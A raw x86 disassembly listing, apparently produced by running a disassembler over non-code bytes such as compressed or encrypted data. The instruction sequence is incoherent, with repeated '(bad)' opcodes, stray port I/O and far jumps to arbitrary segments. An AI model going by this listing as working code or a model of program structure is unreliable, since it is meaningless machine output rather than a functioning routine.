  4a3861:	add    eax,0xb0706822
  4a3866:	ror    DWORD PTR [ebx],1
  4a3868:	and    ch,dl
  4a386a:	in     al,0x95
  4a386c:	inc    di
  4a386e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a386f:	add    edx,DWORD PTR [ecx-0x78]
  4a3872:	push   edx
  4a3873:	add    ecx,ebx
  4a3875:	push   ecx
  4a3876:	or     BYTE PTR [edi],0x0
  4a3879:	push   es
  4a387a:	and    BYTE PTR [ecx+0x19],cl
  4a387d:	mov    eax,0x6503f9e3
  4a3882:	adc    bh,BYTE PTR ds:0x8d10b1d
  4a3888:	frstor [ecx+0x51d04c20]
  4a388e:	mov    eax,0xa505261a
  4a3893:	pop    ss
  4a3894:	mov    ah,0xd9
  4a3896:	daa    
  4a3897:	sub    BYTE PTR [eax],cl
  4a3899:	push   es
  4a389a:	test   eax,0xeebf7748
  4a389f:	in     eax,dx
  4a38a0:	jns    0x4a390e
  4a38a2:	lods   eax,DWORD PTR ds:[esi]
  4a38a3:	pusha  
  4a38a4:	push   eax
  4a38a5:	rcl    BYTE PTR [edx-0x27],1
  4a38a8:	scas   eax,DWORD PTR es:[edi]
  4a38a9:	mov    al,0x1c
  4a38ab:	(bad)  
  4a38ac:	and    eax,0xae83c16d
  4a38b1:	sbb    ebp,DWORD PTR [ebx+0x62]
  4a38b4:	jp     0x4a386c
  4a38b6:	dec    esp
  4a38b7:	sub    BYTE PTR [edi],ch
  4a38b9:	xor    DWORD PTR [ecx],eax
  4a38bb:	shl    DWORD PTR [esp+edx*4-0x17],0x38
  4a38c0:	add    edi,DWORD PTR [eax]
  4a38c2:	add    ecx,esp
  4a38c4:	mov    bh,BYTE PTR [ebx-0x4a795fae]
  4a38ca:	and    ebp,DWORD PTR [edi+ebx*4-0x45]
  4a38ce:	inc    ebp
  4a38cf:	bound  edi,QWORD PTR [ecx+0xd]
  4a38d2:	adc    ch,BYTE PTR [bx+di]
  4a38d5:	repz sbb esp,DWORD PTR [ebx]
  4a38d8:	adc    eax,0x2f2ec372
  4a38dd:	sbb    al,0x4a
  4a38df:	lock mov BYTE PTR [ebp+0x1b8bcf09],ch
  4a38e6:	lea    edi,[eax-0x2f53ceae]
  4a38ec:	mov    eax,0xd775431d
  4a38f1:	and    eax,0x3d5495d9
  4a38f6:	sbb    esp,DWORD PTR [eax+0x5b]
  4a38f9:	add    ecx,ecx
  4a38fb:	adc    eax,0xb8d92bf7
  4a3900:	or     DWORD PTR [esi],ebx
  4a3902:	add    BYTE PTR [eax+0xb],ah
  4a3905:	leave  
  4a3906:	add    edx,eax
  4a3908:	aam    0x1a
  4a390a:	push   0x1fc48506
  4a390f:	cmp    al,0xca
  4a3911:	mov    dh,0x46
  4a3913:	shr    BYTE PTR [esi],cl
  4a3915:	mov    es,WORD PTR [ecx+ecx*4]
  4a3918:	dec    edi
  4a3919:	aam    0x9f
  4a391b:	mov    dl,0x47
  4a391d:	xchg   esp,eax
  4a391e:	(bad)  
  4a391f:	xor    DWORD PTR [ebp-0x24],edx
  4a3922:	mov    ds:0x14489054,al
  4a3927:	xor    BYTE PTR [edi-0xe9fb75b],0x29
  4a392e:	and    al,0xec
  4a3930:	mov    edx,0x28b29004
  4a3935:	xchg   edi,eax
  4a3936:	test   BYTE PTR [edx+eax*1],ch
  4a3939:	lock xor eax,0xc4d68bfd
  4a393f:	mov    DWORD PTR [eax],edx
  4a3941:	jne    0x4a3903
  4a3943:	add    DWORD PTR [edi],0xffffffb8
  4a3946:	bound  eax,QWORD PTR [eax+0xf]
  4a3949:	xchg   ebp,eax
  4a394a:	mov    bh,0x41
  4a394c:	inc    esp
  4a394d:	sub    dl,ah
  4a394f:	jp     0x4a3987
  4a3951:	push   edx
  4a3952:	mov    al,0xf8
  4a3954:	jns    0x4a3959
  4a3956:	push   es
  4a3957:	push   ecx
  4a3958:	scas   eax,DWORD PTR es:[edi]
  4a3959:	popf   
  4a395a:	and    bl,BYTE PTR [edx]
  4a395c:	mov    esp,0x191b8483
  4a3961:	adc    BYTE PTR [eax],ch
  4a3963:	out    0x1,eax
  4a3965:	fisub  WORD PTR [esi+0x3898670e]
  4a396b:	in     al,dx
  4a396c:	mov    esi,DWORD PTR [edi+0xc]
  4a396f:	push   edx
  4a3970:	jmp    FWORD PTR [esi-0x766f7f60]
  4a3976:	sbb    al,0x8e
  4a3978:	pop    ss
  4a3979:	loopne 0x4a3904
  4a397b:	pop    esp
  4a397c:	mov    fs,WORD PTR [edx+0x58]
  4a397f:	push   es
  4a3980:	or     dh,BYTE PTR [edx+esi*1+0x7b]
  4a3984:	and    eax,0xcee8821a
  4a3989:	xor    BYTE PTR [edx+ecx*4],dh
  4a398c:	scas   eax,DWORD PTR es:[edi]
  4a398d:	push   ecx
  4a398e:	lds    ecx,FWORD PTR [edx+0x430974f0]
  4a3994:	jns    0x4a39b9
  4a3996:	or     al,0x86
  4a3998:	cmp    DWORD PTR [eax+0x14c53b19],eax
  4a399e:	(bad)  
  4a399f:	and    eax,0x2b19ac3f
  4a39a4:	add    ebp,DWORD PTR [ebp+0x547f83eb]
  4a39aa:	sbb    al,0x95
  4a39ac:	or     bl,BYTE PTR [eax-0x3a]
  4a39af:	or     DWORD PTR [eax],ebx
  4a39b1:	mov    esp,0x4e7b97ad
  4a39b6:	or     esp,DWORD PTR [esp+ebx*2+0x37]
  4a39ba:	mov    ds:0x77b8b882,al
  4a39bf:	je     0x4a39d0
  4a39c1:	out    dx,al
  4a39c2:	add    al,0xe0
  4a39c4:	sbb    ecx,ecx
  4a39c6:	mov    DWORD PTR ds:0x2a18e181,ebp
  4a39cc:	mov    DWORD PTR [edi+0x4e],eax
  4a39cf:	sub    DWORD PTR [ebp+ebx*2-0x68febe66],esi
  4a39d6:	std    
  4a39d7:	jb     0x4a39b2
  4a39d9:	or     cl,BYTE PTR [edi]
  4a39db:	inc    edi
  4a39dc:	fs xchg edx,eax
  4a39de:	or     cl,dl
  4a39e0:	jp     0x4a3996
  4a39e2:	push   edx
  4a39e3:	push   ebx
  4a39e4:	outs   dx,DWORD PTR ds:[esi]
  4a39e5:	push   es
  4a39e6:	push   eax
  4a39e7:	mov    al,ds:0x3dd8c2e2
  4a39ec:	mov    eax,ds:0x907dc81a
  4a39f1:	jno    0x4a39f4
  4a39f3:	inc    ebx
  4a39f4:	je     0x4a3a4b
  4a39f6:	les    edi,FWORD PTR [ebx]
  4a39f8:	jl     0x4a3a1e
  4a39fa:	pushf  
  4a39fb:	mov    esp,0xcc5df817
  4a3a00:	push   cs
  4a3a01:	sub    BYTE PTR [eax-0x2bbdac4f],al
  4a3a07:	pop    esi
  4a3a08:	jg     0x4a3a15
  4a3a0a:	cmp    BYTE PTR [eax-0x1fbb9ef7],0x92
  4a3a11:	shr    bl,1
  4a3a13:	daa    
  4a3a14:	nop
  4a3a15:	mov    BYTE PTR [eax+0x46],dl
  4a3a18:	icebp  
  4a3a19:	jns    0x4a39b8
  4a3a1b:	sub    BYTE PTR [edx+eiz*4+0x3],dh
  4a3a1f:	shl    BYTE PTR [edi-0x6],1
  4a3a22:	add    BYTE PTR [ebx+0x6c8301a5],0x78
  4a3a29:	pop    ss
  4a3a2a:	ficomp DWORD PTR [edx+0x5]
  4a3a2d:	mov    bh,0x7
  4a3a2f:	sub    al,0x5
  4a3a31:	sub    eax,0xd85a6e82
  4a3a36:	mov    al,BYTE PTR [ecx]
  4a3a38:	mov    bh,BYTE PTR [ecx+eiz*2]
  4a3a3b:	mov    ds:0xd9a58003,al
  4a3a40:	pop    eax
  4a3a41:	inc    edx
  4a3a42:	mov    ah,0x62
  4a3a44:	mov    esi,DWORD PTR [ebx-0xc76d71a]
  4a3a4a:	sub    BYTE PTR [ecx-0x11],dl
  4a3a4d:	or     BYTE PTR [edi],cl
  4a3a4f:	push   cs
  4a3a50:	ret    
  4a3a51:	fist   DWORD PTR [edi-0x61]
  4a3a54:	pushf  
  4a3a55:	rol    BYTE PTR [esp+esi*1-0x312c4fd8],1
  4a3a5c:	popf   
  4a3a5d:	sub    esp,0x9
  4a3a60:	inc    eax
  4a3a61:	shl    BYTE PTR [ebx-0x47],cl
  4a3a64:	add    BYTE PTR [esi+0x71f27975],ch
  4a3a6a:	adc    al,0x1c
  4a3a6c:	adc    BYTE PTR [edx+0x0],bh
  4a3a6f:	jne    0x4a39f7
  4a3a71:	push   edx
  4a3a72:	and    BYTE PTR [esi-0x7e704932],dh
  4a3a78:	push   edx
  4a3a79:	lock xchg ecx,eax
  4a3a7b:	inc    edx
  4a3a7c:	dec    ebp
  4a3a7d:	ror    BYTE PTR [edx-0x47feb56b],1
  4a3a83:	rol    BYTE PTR [ebp+0x511c4328],0xb9
  4a3a8a:	and    BYTE PTR [ecx-0x4d],dl
  4a3a8d:	push   esp
  4a3a8e:	sbb    al,0x8a
  4a3a90:	add    BYTE PTR [edx+edx*8+0xc],dl
  4a3a94:	add    al,0xb8
  4a3a96:	xchg   esi,eax
  4a3a97:	repz test BYTE PTR [edi-0x12f1f5bd],al
  4a3a9e:	inc    ebp
  4a3a9f:	jle    0x4a3a2e
  4a3aa1:	and    DWORD PTR [eax+ebp*2+0x26],ebp
  4a3aa5:	and    cl,BYTE PTR [edi]
  4a3aa7:	adc    BYTE PTR [ebx+ecx*1-0x2287e560],dl
  4a3aae:	rcl    DWORD PTR [ebp+0x3b88f051],1
  4a3ab4:	adc    esi,DWORD PTR [edx+0x59515a06]
  4a3aba:	fcomp  QWORD PTR [esi+0x49]
  4a3abd:	loopne 0x4a3a47
  4a3abf:	adc    DWORD PTR [ebp+ebp*4-0x3],ebp
  4a3ac3:	push   esp
  4a3ac4:	pop    eax
  4a3ac5:	push   es
  4a3ac6:	or     BYTE PTR [edi],dh
  4a3ac8:	loopne 0x4a3af1
  4a3aca:	adc    cl,dh
  4a3acc:	fcom   DWORD PTR [esi]
  4a3ace:	arpl   WORD PTR [ecx+esi*8+0x1138f1c8],ax
  4a3ad5:	mov    WORD PTR [ecx+0x5a87c87c],cs
  4a3adb:	in     al,dx
  4a3adc:	jo     0x4a3a8f
  4a3ade:	mov    eax,ds:0x5702018d
  4a3ae3:	sbb    ah,ah
  4a3ae5:	test   BYTE PTR [ecx],al
  4a3ae7:	mov    ?,WORD PTR [edi+0x70]
  4a3aea:	mov    al,0xa7
  4a3aec:	mov    ah,0xd1
  4a3aee:	lock addr16 (bad) 
  4a3af2:	pushf  
  4a3af3:	mov    eax,0xd167e0ef
  4a3af8:	adc    BYTE PTR [ebx-0x72],cl
  4a3afb:	lds    edx,FWORD PTR [esi]
  4a3afd:	cmp    BYTE PTR [ebx+0x67810ed0],0x3b
  4a3b04:	test   dl,cl
  4a3b06:	(bad)  
  4a3b07:	fld    QWORD PTR [ebx]
  4a3b09:	cmp    DWORD PTR ds:0x8efec1d1,eax
  4a3b0f:	mov    al,0x20
  4a3b11:	repnz in al,0xd5
  4a3b14:	push   ss
  4a3b15:	mov    cl,0x6f
  4a3b17:	outs   dx,DWORD PTR ds:[esi]
  4a3b18:	cld    
  4a3b19:	data16 cld 
  4a3b1b:	cmp    eax,0xeb782633
  4a3b20:	mov    cs,WORD PTR [ecx]
  4a3b22:	aam    0x61
  4a3b24:	or     bl,0x0
  4a3b27:	cmp    al,0x58
  4a3b29:	jb     0x4a3b31
  4a3b2b:	and    eax,0xb18c00c2
  4a3b30:	add    BYTE PTR [edx],bl
  4a3b32:	inc    esi
  4a3b33:	push   0xb51f981
  4a3b38:	cmc    
  4a3b39:	sbb    BYTE PTR [ebx-0x53],0x74
  4a3b3d:	adc    DWORD PTR [edi-0x64],esi
  4a3b40:	dec    eax
  4a3b41:	ds inc edx
  4a3b43:	in     eax,dx
  4a3b44:	xlat   BYTE PTR ds:[ebx]
  4a3b45:	add    bh,bh
  4a3b47:	xor    edx,DWORD PTR [ecx]
  4a3b49:	stc    
  4a3b4a:	push   0xecff418f
  4a3b4f:	add    eax,0x5799c68c
  4a3b54:	adc    eax,0x61a3c992
  4a3b59:	test   dh,cl
  4a3b5b:	pushf  
  4a3b5c:	retf   
  4a3b5d:	cmp    BYTE PTR ss:[edi+0x8],ch
  4a3b61:	jmp    0x5d2a36cb
  4a3b66:	sti    
  4a3b67:	pop    ebx
  4a3b68:	mov    ecx,ecx
  4a3b6a:	sbb    esp,DWORD PTR ds:0xc400fb53
  4a3b70:	arpl   WORD PTR [ebx+0x79],cx
  4a3b73:	and    DWORD PTR [edi+0x38],ebp
  4a3b76:	(bad)  
  4a3b77:	std    
  4a3b78:	iret   
  4a3b79:	pop    ecx
  4a3b7a:	std    
  4a3b7b:	dec    eax
  4a3b7c:	std    
  4a3b7d:	in     al,0xb0
  4a3b7f:	fld    DWORD PTR [edx]
  4a3b81:	jno    0x4a3b89
  4a3b83:	stos   DWORD PTR es:[edi],eax
  4a3b84:	std    
  4a3b85:	cli    
  4a3b86:	jns    0x4a3bdd
  4a3b88:	inc    ebp
  4a3b89:	add    eax,0x7a05c7cd
  4a3b8e:	dec    ebx
  4a3b8f:	mov    DWORD PTR [edx],eax
  4a3b91:	daa    
  4a3b92:	or     al,0xa3
  4a3b94:	mov    edx,0x286c3725
  4a3b99:	popf   
  4a3b9a:	outs   dx,BYTE PTR ds:[esi]
  4a3b9b:	push   ds
  4a3b9c:	inc    ebx
  4a3b9d:	(bad)  
  4a3b9f:	sbb    eax,0x2acc2229
  4a3ba4:	aam    0xc2
  4a3ba6:	sub    BYTE PTR [ebp+0x56],ch
  4a3ba9:	jae    0x4a3bc6
  4a3bab:	rol    DWORD PTR [ebp-0x43967bd1],cl
  4a3bb1:	mov    DWORD PTR [eax+esi*2],esp
  4a3bb4:	les    esp,FWORD PTR [esp+edi*2+0x1f]
  4a3bb8:	(bad)  
  4a3bb9:	outs   dx,DWORD PTR ds:[esi]
  4a3bba:	pop    esi
  4a3bbb:	and    eax,0x47fa0308
  4a3bc0:	push   ebp
  4a3bc1:	hlt    
  4a3bc2:	ins    DWORD PTR es:[edi],dx
  4a3bc3:	cmp    eax,0x8dee96fd
  4a3bc8:	or     DWORD PTR [ecx],edi
  4a3bca:	sbb    al,0xe8
  4a3bcc:	xchg   esi,eax
  4a3bcd:	outs   dx,BYTE PTR ds:[esi]
  4a3bce:	ds adc ch,bl
  4a3bd1:	(bad)  
  4a3bd3:	adc    BYTE PTR [edx+0x743d1103],cl
  4a3bd9:	sahf   
  4a3bda:	lds    ebx,FWORD PTR [edx]
  4a3bdc:	push   eax
  4a3bdd:	ja     0x4a3b76
  4a3bdf:	jmp    0x4a3bb5
  4a3be1:	test   al,0x3a
  4a3be3:	xor    DWORD PTR [eax+eax*4-0x78],ecx
  4a3be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a3be8:	jge    0x4a3bca
  4a3bea:	dec    edx
  4a3beb:	push   es
  4a3bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3bee:	sbb    ebx,DWORD PTR [ebx]
  4a3bf0:	into   
  4a3bf1:	xchg   ebx,eax
  4a3bf2:	sbb    al,0x69
  4a3bf4:	push   esi
  4a3bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a3bf6:	loopne 0x4a3bc1
  4a3bf8:	or     al,dl
  4a3bfa:	or     eax,eax
  4a3bfc:	leave  
  4a3bfd:	cmp    esi,DWORD PTR [esi]
  4a3bff:	add    eax,DWORD PTR [edx]
  4a3c01:	call   0x4e21:0xb4a40b75
  4a3c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3c09:	(bad)  [eax+0x60c3c00b]
  4a3c0f:	adc    DWORD PTR [edi],edx
  4a3c11:	and    BYTE PTR [edi-0x59],0xd1
  4a3c15:	mov    ch,0xd3
  4a3c17:	cmp    BYTE PTR [edi+0x70],ch
  4a3c1a:	push   es
  4a3c1b:	add    eax,0x7e6f141
  4a3c20:	xor    DWORD PTR [edi],eax
  4a3c22:	je     0x4a3c6e
  4a3c24:	jmp    0x4a3c42
  4a3c26:	jmp    esp
  4a3c28:	xchg   ebp,eax
  4a3c29:	sbb    DWORD PTR [edx+0x74],edi
  4a3c2c:	das    
  4a3c2d:	cli    
  4a3c2e:	icebp  
  4a3c2f:	loopne 0x4a3c26
  4a3c31:	add    BYTE PTR [ebx],0xfa
  4a3c34:	jl     0xfcf95810
  4a3c3a:	jns    0x4a3c04
  4a3c3c:	mov    DWORD PTR [eax-0x24ee8e43],ebx
  4a3c42:	add    BYTE PTR [eax+0x11263d66],al
  4a3c48:	and    bh,BYTE PTR [edi-0x1bba7fb7]
  4a3c4e:	mov    al,0xa6
  4a3c50:	xchg   esi,eax
  4a3c51:	sbb    ah,BYTE PTR [edx]
  4a3c53:	mov    eax,0x60cbc5a
  4a3c58:	mov    ecx,0x806a542b
  4a3c5d:	push   ebp
  4a3c5e:	frstor [ecx+0x4548dfd2]
  4a3c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a3c65:	inc    edi
  4a3c66:	(bad)  
  4a3c67:	sti    
  4a3c68:	retf   
  4a3c69:	stos   BYTE PTR es:[edi],al
  4a3c6a:	shl    dl,cl
  4a3c6c:	ror    DWORD PTR [eax+edx*4+0x10],cl
  4a3c70:	retf   
  4a3c71:	add    bh,BYTE PTR [ecx]
  4a3c73:	add    bh,dl
  4a3c75:	xchg   ecx,eax
  4a3c76:	retf   
  4a3c77:	dec    esi
  4a3c78:	push   eax
  4a3c79:	push   eax
  4a3c7a:	jns    0xb3678e18
  4a3c80:	xor    DWORD PTR [edx-0x76ad0bcf],edx
  4a3c86:	ins    BYTE PTR es:[edi],dx
  4a3c87:	mov    eax,ds:0x5eef6a4e
  4a3c8c:	lahf   
  4a3c8d:	mov    edx,0x627029c
  4a3c92:	jmp    0x4a3ca3
  4a3c94:	cli    
  4a3c95:	pop    ebp
  4a3c96:	push   es
  4a3c97:	cli    
  4a3c98:	ret    0xec05
  4a3c9b:	test   ch,dh
  4a3c9d:	stc    
  4a3c9e:	and    BYTE PTR [edx],al
  4a3ca0:	cmp    esp,esp
  4a3ca2:	repnz push esp
  4a3ca4:	sub    eax,0xb9686657
  4a3ca9:	dec    ebp
  4a3caa:	mov    al,ds:0x40634d58
  4a3caf:	(bad)  
  4a3cb1:	xor    ecx,DWORD PTR [eax-0x21]
  4a3cb4:	mov    dh,0xb7
  4a3cb6:	(bad)  
  4a3cb8:	push   esp
  4a3cb9:	jge    0x4a3c4b
  4a3cbb:	adc    ebx,DWORD PTR cs:[ebp+0x1f]
  4a3cbf:	outs   dx,DWORD PTR ds:[esi]
  4a3cc0:	push   0xcce78ab0
  4a3cc5:	out    dx,al
  4a3cc6:	daa    
  4a3cc7:	pop    es
  4a3cc8:	mov    al,0xe7
  4a3cca:	push   esp
  4a3ccb:	add    eax,0xcc8d990a
  4a3cd0:	test   al,0x61
  4a3cd3:	xor    esp,DWORD PTR [ecx+0x6127131]
  4a3cd9:	mov    bh,0x34
  4a3cdb:	dec    ebp
  4a3cdc:	dec    ebx
  4a3cdd:	add    edi,DWORD PTR [ecx-0xd8e89cf]
  4a3ce3:	push   0x3c08f404
  4a3ce8:	imul   ecx,ebp,0x197765d0
  4a3cee:	je     0x4a3d59
  4a3cf0:	bound  ebp,QWORD PTR [edi+0x6a]
  4a3cf3:	or     al,0x8b
  4a3cf5:	cmp    cl,0xb9
  4a3cf8:	je     0x4a3d11
  4a3cfa:	or     eax,0x3745cb86
  4a3cff:	and    edx,DWORD PTR [edi]
  4a3d01:	cs test eax,0xd7055694
  4a3d07:	jg     0x4a3d72
  4a3d09:	push   ebp
  4a3d0a:	sub    BYTE PTR [eax-0x762840b2],ah
  4a3d10:	mov    DWORD PTR [edx+0x5],ebx
  4a3d13:	sub    DWORD PTR [ebp+0x55],0xffffff93
  4a3d17:	dec    esi
  4a3d18:	shl    BYTE PTR [edx+esi*1-0x7f],0xe0
  4a3d1d:	mov    cl,0xa0
  4a3d1f:	pop    ss
  4a3d20:	dec    esp
  4a3d21:	shl    BYTE PTR [esi+0xff70283],0xc0
  4a3d28:	mov    DWORD PTR [eax],ebp
  4a3d2a:	out    0x98,eax
  4a3d2c:	or     eax,0x57b0035f
  4a3d31:	inc    eax
  4a3d32:	out    dx,eax
  4a3d33:	mov    edx,0xe1b980f3
  4a3d38:	push   ss
  4a3d39:	pop    edx
  4a3d3a:	ret    
  4a3d3b:	sbb    dh,BYTE PTR [ebp+0x5c2e3f10]
  4a3d41:	inc    ebp
  4a3d42:	add    edi,edi
  4a3d44:	stos   DWORD PTR es:[edi],eax
  4a3d45:	or     DWORD PTR [edx-0x7cf8dc6f],edi
  4a3d4b:	cmc    
  4a3d4c:	jp     0x4a3d43
  4a3d4e:	jno    0x4a3d60
  4a3d50:	dec    eax
  4a3d51:	push   esi
  4a3d52:	ror    DWORD PTR [eax],0x6d
  4a3d55:	les    esp,FWORD PTR [ebp-0xb]
  4a3d58:	cdq    
  4a3d59:	ds push cs
  4a3d5b:	sbb    eax,DWORD PTR [esi+0x67]
  4a3d5e:	cmp    eax,0xa282b7f5
  4a3d63:	into   
  4a3d64:	push   es
  4a3d65:	cdq    
  4a3d66:	test   eax,0xc52f252e
  4a3d6b:	cmc    
  4a3d6c:	fsub   QWORD PTR [ecx]
  4a3d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3d6f:	loop   0x4a3de8
  4a3d71:	xchg   esp,eax
  4a3d72:	or     al,0xdd
  4a3d74:	hlt    
  4a3d75:	inc    edi
  4a3d76:	xor    al,0x1f
  4a3d78:	add    al,0x38
  4a3d7a:	push   ebp
  4a3d7b:	lock dec edx
  4a3d7d:	mov    edi,0x41258ae9
  4a3d82:	fsubr  QWORD PTR [esi-0x4a62ca53]
  4a3d88:	or     cl,bl
  4a3d8a:	imul   ebx,DWORD PTR [ebx-0x60],0xffffff9c
  4a3d8e:	and    BYTE PTR [ecx+eiz*2+0x5f],dl
  4a3d92:	pop    ebp
  4a3d93:	fcomi  st,st(6)
  4a3d95:	pop    esi
  4a3d96:	enter  0x9e9b,0xd2
  4a3d9a:	idiv   BYTE PTR [ecx-0x37]
  4a3d9d:	idiv   BYTE PTR [eax+0x414b0ef6]
  4a3da3:	dec    esp
  4a3da4:	ja     0x4a3df7
  4a3da6:	mov    al,ds:0x6c228cf6
  4a3dab:	sbb    bl,BYTE PTR [ecx-0x6c]
  4a3dae:	inc    edi
  4a3daf:	adc    ecx,DWORD PTR [esi]
  4a3db1:	inc    eax
  4a3db2:	xor    DWORD PTR [eax+0x30],edi
  4a3db5:	lock loope 0x4a3d5f
  4a3db8:	or     ebp,DWORD PTR [edi]
  4a3dba:	dec    ecx
  4a3dbb:	lock push ss
  4a3dbd:	pop    ds
  4a3dbe:	or     DWORD PTR [edx+0x1e],ebp
  4a3dc1:	pop    ecx
  4a3dc2:	add    eax,0xb1f6497e
  4a3dc7:	idiv   bh
  4a3dc9:	push   cs
  4a3dca:	fwait
  4a3dcb:	or     bh,dl
  4a3dcd:	dec    ebx
  4a3dce:	add    eax,0x564a4611
  4a3dd3:	sub    al,0xf6
  4a3dd5:	adc    al,0x19
  4a3dd7:	mov    BYTE PTR [edx],cl
  4a3dd9:	gs stos DWORD PTR es:[edi],eax
  4a3ddb:	pop    eax
  4a3ddc:	xor    BYTE PTR [eax],dl
  4a3dde:	aaa    
  4a3ddf:	mov    ebx,0xb9701f17
  4a3de4:	loopne 0x4a3e42
  4a3de6:	lahf   
  4a3de7:	mov    ecx,0x6211ff5
  4a3dec:	xor    ecx,DWORD PTR [esi]
  4a3dee:	inc    edx
  4a3def:	dec    esi
  4a3df0:	adc    DWORD PTR [ebx-0x2da84d0b],esp
  4a3df6:	and    dh,BYTE PTR [eax-0x618cad94]
  4a3dfc:	sub    al,ah
  4a3dfe:	or     edi,DWORD PTR [eax-0x25]
  4a3e01:	or     DWORD PTR [edx],0xf2791500
  4a3e07:	or     BYTE PTR ds:0xf555f0a7,ah
  4a3e0d:	stos   DWORD PTR es:[edi],eax
  4a3e0e:	in     al,0x50
  4a3e10:	mov    ch,0x43
  4a3e12:	rol    DWORD PTR [ecx-0x37ebb5ad],1
  4a3e18:	rol    DWORD PTR [ecx-0x51d2774f],1
  4a3e1e:	sub    DWORD PTR [eax],edx
  4a3e20:	je     0x2ece2fc2
  4a3e26:	jae    0x4a3daf
  4a3e28:	out    0xff,eax
  4a3e2a:	add    DWORD PTR [edx],ebp
  4a3e2c:	or     esi,DWORD PTR [edx-0x14697fd]
  4a3e32:	add    cl,BYTE PTR [bx+0x35a2]
  4a3e37:	push   ecx
  4a3e38:	xor    eax,0x1c9e090c
  4a3e3d:	mov    ds:0xa93f7f11,al
  4a3e42:	repz adc esp,esi
  4a3e45:	xor    al,0x20
  4a3e47:	stc    
  4a3e48:	dec    eax
  4a3e49:	test   BYTE PTR [ebx+esi*8-0x31b0df59],cl
  4a3e50:	mov    bl,0xd0
  4a3e52:	out    dx,al
  4a3e53:	(bad)  
  4a3e54:	out    dx,al
  4a3e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3e56:	mov    BYTE PTR [edi+edx*2+0x6f696947],ch
  4a3e5d:	add    ebp,ebx
  4a3e5f:	out    dx,eax
  4a3e60:	pop    edx
  4a3e61:	rol    DWORD PTR [ecx],0x4c
  4a3e64:	or     BYTE PTR [edi-0x61],bh
  4a3e67:	push   0xffffffee
  4a3e69:	add    al,al
  4a3e6b:	in     al,0x1d
  4a3e6d:	jns    0x4a3e87
  4a3e6f:	repz scas eax,DWORD PTR es:[edi]
  4a3e71:	mov    edx,0xd33fa2f0
  4a3e76:	mov    esi,0xf9bed3df
  4a3e7b:	arpl   WORD PTR [eax+0x20],dx
  4a3e7e:	pop    ebp
  4a3e7f:	ins    DWORD PTR es:[edi],dx
  4a3e80:	in     eax,dx
  4a3e81:	cmp    al,0x8
  4a3e83:	cdq    
  4a3e84:	or     bh,al
  4a3e86:	fld    QWORD PTR [esi]
  4a3e88:	jns    0x4a3ea7
  4a3e8a:	sub    ebp,DWORD PTR [ebp+ebx*4+0x5f]
  4a3e8e:	sbb    eax,0xb4a7f1ef
  4a3e93:	cmp    al,0x57
  4a3e95:	imul   ebx
  4a3e97:	pop    es
  4a3e98:	out    dx,eax
  4a3e99:	js     0x4a3ef7
  4a3e9b:	sub    ecx,DWORD PTR [eax]
  4a3e9d:	fnstcw WORD PTR [edi-0x48]
  4a3ea0:	repnz or al,0x67
  4a3ea3:	sub    BYTE PTR [ebp+0xf],al
  4a3ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3ea7:	dec    esi
  4a3ea8:	lds    eax,FWORD PTR [eax+0x32e93eb3]
  4a3eae:	push   es
  4a3eaf:	dec    edi
  4a3eb0:	js     0x4a3f24
  4a3eb2:	or     al,BYTE PTR [ebx+0x58]
  4a3eb5:	in     al,dx
  4a3eb6:	push   es
  4a3eb7:	icebp  
  4a3eb8:	aam    0xf0
  4a3eba:	or     ebx,DWORD PTR [eax+0x44]
  4a3ebd:	loopne 0x4a3ecb
  4a3ebf:	jne    0x4a3f0f
  4a3ec1:	popa   
  4a3ec2:	xchg   DWORD PTR [eax+0x2469510f],edx
  4a3ec8:	in     al,dx
  4a3ec9:	(bad)  
  4a3eca:	inc    DWORD PTR [edi]
  4a3ecc:	in     al,dx
  4a3ecd:	mov    eax,0xffc9e380
  4a3ed2:	(bad)  
  4a3ed3:	sti    
  4a3ed4:	jmp    0x4a3ea1
  4a3ed6:	(bad)  
  4a3ed7:	and    BYTE PTR [ebx],al
  4a3ed9:	push   eax
  4a3eda:	or     edi,edi
  4a3edc:	(bad)  
  4a3edd:	loopne 0x4a3f43
  4a3edf:	and    BYTE PTR [ecx-0xd],dl
  4a3ee2:	scas   eax,DWORD PTR es:[edi]
  4a3ee3:	adc    dl,ah
  4a3ee5:	mov    ds:0xfe5042d2,al
  4a3eea:	(bad)  
  4a3eeb:	call   FWORD PTR [ebp-0x7f]
  4a3eee:	add    bl,dh
  4a3ef0:	jmp    DWORD PTR [ecx*4+0x10709572]
  4a3ef7:	mov    al,0xf8
  4a3ef9:	fs dec edx
  4a3efb:	xchg   BYTE PTR [ebx-0x2],ah
  4a3efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a3eff:	xchg   ecx,eax
  4a3f00:	lock xor eax,0xeb105a95
  4a3f06:	xor    eax,0x7c04569d
  4a3f0b:	or     BYTE PTR [esi+0x4646e0b8],al
  4a3f11:	jle    0x4a3f33
  4a3f13:	or     edx,DWORD PTR [eax+ebx*8-0x10d146]
  4a3f1a:	jmp    DWORD PTR [ebx]
  4a3f1c:	mov    dl,0xc3
  4a3f1e:	and    esp,ecx
  4a3f20:	adc    al,0xdd
  4a3f22:	mov    ebp,0x4e57d8
  4a3f27:	scas   eax,DWORD PTR es:[edi]
  4a3f28:	test   bh,ch
  4a3f2a:	mov    dl,ch
  4a3f2c:	mov    ecx,DWORD PTR [ebp-0x6]
  4a3f2f:	inc    esi
  4a3f30:	(bad)  
  4a3f31:	sbb    eax,0xea7b840f
  4a3f36:	jb     0x4a3f49
  4a3f38:	and    dl,cl
  4a3f3a:	jmp    0xe961:0x61425ec6
  4a3f41:	pop    ecx
  4a3f42:	pop    ds
  4a3f43:	pop    es
  4a3f44:	stc    
  4a3f45:	sahf   
  4a3f46:	add    BYTE PTR [edi+0x47840f2c],al
  4a3f4c:	jmp    0x20e5:0xbc8601c2
  4a3f53:	xor    edx,ebp
  4a3f55:	fs sbb ecx,DWORD PTR es:[edx]
  4a3f59:	mov    esi,0xea16e984
  4a3f5e:	pop    es
